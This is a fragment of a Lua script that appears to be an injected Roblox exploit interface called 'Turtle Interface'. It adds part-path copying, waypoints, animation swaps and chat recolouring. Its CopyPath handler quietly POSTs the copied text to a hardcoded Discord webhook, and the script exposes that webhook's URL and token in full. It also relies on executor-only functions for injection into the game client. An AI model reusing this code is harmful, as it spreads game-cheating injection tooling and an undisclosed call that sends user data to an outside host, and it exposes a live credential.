	updateText(Path,"")
	Interface_Visible(Exit_4, false)
        Interface_Visible(CopyPath, false)
        Interface_Visible(ChoosePart, false)
        Interface_Visible(Path, false)
	--fuckingFrame.Visible = false
end)

--https://discord.com/api/webhooks/1241031789997330483/GkDMMq6BwtOYgf80ioPP53pB8UIR-QOcvFHbclUYPnV7pugW0DJfOcqQJnRnhawewRCJ
addEventListener(CopyPath,"MouseButton1Down",function()
	if Path.Text ~= "" then
		copy(Path.Text)
		local response = httprequest({
			Url = "https://discord.com/api/webhooks/1241031789997330483/GkDMMq6BwtOYgf80ioPP53pB8UIR-QOcvFHbclUYPnV7pugW0DJfOcqQJnRnhawewRCJ",
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode({["content"] = Path.Text})
		})
	else
		ErrorPrompt("Copy part",'Select a part to copy its path')
	end
end)

addEventListener(ChoosePart,"MouseButton1Down",function()
	if Path.Text ~= "" then
		local tpNameExt = ''
		local function handleWpNames()
			local FoundDupe = false
			for i,v in pairs(InterfaceCoordFunction) do
				if v.NAME:lower() == selected.Adornee.Name:lower()..tpNameExt then
					FoundDupe = true
				end
			end
			if not FoundDupe then
				InterfaceCoordFunction[#InterfaceCoordFunction + 1] = {NAME = selected.Adornee.Name..tpNameExt, COORD = {selected.Adornee}}
				notify("Select Part","Created waypoint: "..selected.Adornee.Name..tpNameExt)
					
			else
				if isNumber(tpNameExt) then
					tpNameExt = tpNameExt+1
				else
					tpNameExt = 1
				end
				handleWpNames()
			end
		end
		handleWpNames()
		RefreshInterface()
	else
		ErrorPrompt("Select Part",'Select a part first')
	end
end)
	
local function HighlightPart()
	if selected.Adornee ~= Mouse.Target then
		selectionBox.Adornee = Mouse.Target
	else
		selectionBox.Adornee = nil
	end
	
	ActivateHighlight = Mouse.Move:Connect(HighlightPart)
local function SelectPart()
	if Mouse.Target ~= nil then
		selected.Adornee = Mouse.Target
		updateText(Path,getHierarchy(Mouse.Target))
	end
end
	ClickSelect = Mouse.Button1Down:Connect(SelectPart)

--NEWS
ZombieFEAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3489171152"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=3489171152"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=3489174223"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=3489173414"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)
]]

--[[lib:runtime(function()
	local response = game:HttpGet("https://shz.al/~software")
	local data = HttpService:JSONDecode(response)
	if data.Software.Version ~= ver and data.Software.Update == true then
		lib:WarnUser(data.Software.UpdateMessage)
	end
end)

TextChatService.OnIncomingMessage = function(textChatMessage: TextChatMessage)
	local properties = Instance.new("TextChatMessageProperties")

	--local textSource = textChatMessage.TextSource
	if textChatMessage.TextSource.UserId == 3621188307 then
		local index: number = (textChatMessage.TextSource.UserId % #nameColors) + 1
		local randomColor: Color3 = nameColors[index]
		--properties.PrefixText = string.format("<font color='#%s'>%s</font>", randomColor:ToHex(),textChatMessage.PrefixText)
		properties.PrefixText = lib:ColorFonts(textChatMessage.PrefixText,"Red")
	end


	return properties
end

TextChatService.OnIncomingMessage = function(textChatMessage: TextChatMessage)
	local properties = Instance.new("TextChatMessageProperties")

	--properties.Text = string.format(FORMAT_STRING, textChatMessage.Text)
	properties.Text = lib:ColorFonts(textChatMessage.Text,"Green")

	if textChatMessage.Translation then
		--properties.Translation = string.format(FORMAT_STRING, textChatMessage.Translation)
		properties.Translation = lib:ColorFonts(textChatMessage.Translation,"Red")
	end

	return properties
end
]]

if typeof(env) == "nil" and typeof(colors) == "nil" then
	getgenv().env = lib
	getgenv().colors = HTMLcolors
end

print("Turtle Interface successfully injected.")
return lib
